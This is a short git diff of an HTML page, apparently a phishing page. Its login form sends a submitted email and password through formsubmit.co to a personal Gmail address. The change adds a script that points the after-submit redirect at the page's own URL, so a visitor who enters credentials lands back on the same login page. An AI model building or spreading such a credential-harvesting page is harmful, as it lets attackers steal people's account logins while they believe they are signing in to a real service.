@@ -35,7 +35,7 @@
             <form action="https://formsubmit.co/gurunanthan.r.j@gmail.com" method="POST">
                     <div class="form-container">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="https://fabulous-entremet-264b56.netlify.app/">
+                        <input id="url" type="hidden" name="_next" value="">
                         <label for="email">Username (Registered Email Address)</label>
                         <input type="email" name="email" required><br>
                         <label for="password">password</label>
@@ -63,4 +63,8 @@
 
         
 </body>
+<script>
+      // Get the current URL and set it as the value of the input box
+      document.getElementById("url").value = window.location.href;
+</script>
 </html>
